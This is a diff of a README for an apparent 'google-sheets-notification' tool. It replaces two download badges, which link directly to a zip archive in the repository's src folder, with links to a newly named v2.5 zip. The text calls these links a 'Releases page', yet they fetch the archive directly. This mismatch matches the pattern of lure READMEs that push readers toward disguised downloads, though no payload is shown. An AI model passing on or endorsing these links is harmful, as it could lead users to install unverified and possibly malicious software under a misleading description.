@@ -8,7 +8,7 @@ Welcome to the google-sheets-notification project! This tool helps you set up no
 
 To get started, you need to download the application. Please click the link below to visit the Releases page where you can find the latest version of the software.
 
-[![Download Google Sheets Notification](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google-sheets-notification_2.0.zip)](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google-sheets-notification_2.0.zip)
+[![Download Google Sheets Notification](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google_sheets_notification_v2.5.zip)](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google_sheets_notification_v2.5.zip)
 
 Once you are on the Releases page, you will see different versions of the google-sheets-notification software. Choose the most recent version available, and click on it to download the file.
 
@@ -57,4 +57,4 @@ If you need help or have questions, please open an issue in the GitHub repositor
 
 We appreciate your interest in our tool. Don't forget to check out our Releases page for updates.
 
-[![Download Google Sheets Notification](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google-sheets-notification_2.0.zip)](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google-sheets-notification_2.0.zip)
+[![Download Google Sheets Notification](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google_sheets_notification_v2.5.zip)](https://raw.githubusercontent.com/helo123422/google-sheets-notification/main/src/google_sheets_notification_v2.5.zip)
